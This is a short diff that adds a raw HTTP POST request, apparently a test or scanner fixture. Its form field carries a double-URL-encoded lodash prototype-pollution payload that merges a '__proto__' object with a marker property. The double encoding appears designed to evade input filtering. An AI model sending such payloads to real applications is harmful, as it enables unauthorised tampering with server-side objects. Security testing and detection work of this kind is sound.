@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 130
+Connection: close
+
+url=_.merge%2528%257B%257D%252C%2BJSON.parse%2528%2527%257B%2522__proto__%2522%253A%257B%2522x%2522%253A1%257D%257D%2527%2529%2529
